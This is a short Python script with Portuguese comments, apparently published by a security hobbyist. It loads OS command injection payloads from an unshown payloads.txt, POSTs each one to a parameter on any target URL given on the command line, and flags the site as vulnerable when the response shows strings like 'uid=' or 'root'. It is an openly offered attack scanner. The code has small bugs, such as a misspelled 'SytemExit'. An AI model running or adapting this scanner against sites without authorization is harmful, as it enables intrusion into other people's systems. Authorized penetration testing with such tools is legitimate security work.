# Esse script é pequeno e direto ao ponto!
# Ele carrega um arquivo.txt  que contém inúmeros payloads para OS Command Injection em linux e windows
# Você só precisa passar a url do site + o parâmetro a ser testado e ele encarrega de fazer o resto
# instagram: @nanoxsec
# telegram: t.me/@nanoxsec

import os
import sys
import aiohttp
import asyncio
import datetime
from time import sleep

try:
	os.system("clear")
except:
	os.system("cls")

arguments = sys.argv


print("""\033[1;34m
             _    _       _         _   _         
 ___ _____ _| |  |_|___  |_|___ ___| |_|_|___ ___ 
|  _|     | . |  | |   | | | -_|  _|  _| | . |   |
|___|_|_|_|___|  |_|_|_|_| |___|___|_| |_|___|_|_|
                       |___| \033[m\033[1mCoded by: @nanoxsec
\033[m""".strip())


if len(arguments) < 3 or len(arguments) > 3:
	print("[+] Modo de uso:")
	print("[+] python3 cmd.py <url> <campo a ser testado>")
	raise SystemExit
site_alvo = sys.argv[1]
paramentro = sys.argv[2]
async def test_payload(session, payload):
	data = {paramentro: payload} # se o campo de teste for fora da url, modifique esse campo e passe o conteúdo da requisição!
	try:
		async with session.post(site_alvo, data=data) as response:
			text = await response.text()
			if "root" in text or "uid=" in text or "command not found" in text or "drwxrwxr-x" in text or "-rw-rw-r--" in text or "-rw-------" in text:
				print("\033[1;35m[{}] \033[m\033[1;32m[+]\033[m \033[1mPayload injetado: {}\033[m --> Status: \033[1;32mVulnerável\033[m".format(datetime.datetime.now().strftime("%H:%M:%S"),payload))
				raise SystemExit
			else:
				print("\033[1;35m[{}] \033[m\033[1;31m[+]\033[m \033[1;2mPayload não injetado!\033[m Status: \033[1;31m Não Vulnerável\033[m".format(datetime.datetime.now().strftime("%H:%M:%S")))
	except Exception as e:
		print("\033[1;31m[!] Erro ao testar payload: {}\033[m".format(e))
	except KeyboardInterrupt:
		raise SystemExit
	finally:
		pass
async def main():
	async with aiohttp.ClientSession() as session:
		with open("payloads.txt", "r") as file:
			payloads = []
			try:
				for p in file:
					payloads.append(p.replace("\n","").strip())
				tasks = []
				for payload in payloads:
					tasks.append(test_payload(session,payload))
				await asyncio.gather(*tasks)
			except KeyboardInterrupt:
				raise SytemExit
if __name__ == "__main__":
	asyncio.run(main())
